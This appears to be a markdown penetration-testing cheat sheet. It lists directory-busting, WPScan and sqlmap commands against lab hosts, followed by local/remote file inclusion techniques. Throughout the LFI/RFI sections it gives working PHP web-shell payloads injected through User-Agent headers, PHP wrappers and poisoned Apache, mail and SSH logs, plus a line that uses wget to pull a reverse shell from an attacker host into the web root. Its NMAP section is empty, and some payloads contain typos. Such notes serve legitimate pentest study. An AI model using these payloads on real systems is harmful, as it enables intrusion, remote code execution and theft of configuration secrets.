# Awesome Pentest Notes

***

Table of Contents
=================


 * [NMAP Scan](#-nmap-scan)
 * [Web App Scan](#-web-app-scan)
 * [Wordpress Attacks](#-Wordpress-Attacks)
 * [SQL Injection](#-SQL-Injection)
 * [RFI/LFI Technics](#-rfi-lfi)

 ## [↑](#table-of-contents) NMAP Scan
 ```
 ```
 ## [↑](#table-of-contents) Web App Scan
 ```
 * Dirb
 >> Specifi file extention
 dirb http://10.10.10.56/cgi-bin -X .sh
 dirb http://$target /usr/share/wordlists/dirb/common.txt
 
 * Dirbuster
 dirbuster -u https://192.168.216.131 -H -v -l /usr/share/dirb/wordlists/common.txt

 ```
 ## [↑](#table-of-contents) Wordpress Attacks
 ```
 * WPScan
 wpscan –u http://derpnstink.local/weblog/ --enumerate t --enumerate u
 
 
 ```
 ## [↑](#table-of-contents) SQL Injection
 ```
 * SQLMAP Example - http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
 sqlmap -u 'http://helpdesk.test.lab/login.php' --data='username=username&password=password&submit=Enter' --level=5 --risk=3 --batch
sqlmap -u 'http://192.168.254.129:1337/978345210/index.php' --forms --level=5 --risk=3 --batch
 ```
 
  ## [↑](#table-of-contents) RFI/LFI Technics
  ### /PROC/self/ Environment
  ```
  /proc/self/environ : Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/environ&cmd=ls
  /proc/self/fd : Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/fd&cmd=pwd
  ```
  
  ### PHP Wrapper
  ```
  - PHP://filter
  ?file=php://filter/read=convert.base64-encode/resource=../../config.php
  
  - Expect://
  ?page=expect://ls
  
  - Data://
  […]/fi/?page=data:text/plain,<?system($_GET['x']);?>&x=ls%00 […]/fi/?page=data:,<?system($_GET['cmd']);?>&x=ls%00 […]/fi/?page=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls%00
  
  - PHP://input (POST method)
  URL www.pentest.local/fileincl/vul.php?page=php://input 
  On Burp "Enable Post Data" <? system('wget http://kali/php-reverse-shell.php -O /var/www/shell.php')
 
  ```
  ### PHP://input (POST method)
  ### Log Poisoning to LFI
  ```
  - Inject PHP Shell to Apache log
  $ nc <target_ip> 80 GET /<?php system(&_GET['cmd']); ?> Browse to vulnerable page: […]/fi/?page=/var/log/apache.log&cmd=ls
  
  - Inject PHP Shell to Mail log
  $ mail -s "Hello: <?php system($_GET['cmd']); ?>" pentest@pentest.local < /dev/null 
  Browse to vulnerable page: […]/fi/?page=/var/log/mail.log&cmd=ls
  
  - Inject PHP Shell to SSH log
  $ ssh <? php system($_GET['cmd']);?>@<target_ip> Browse to vulnerable page: […]/fi/?page=/var/log/auth.log&cmd=ls
  
  ```

  
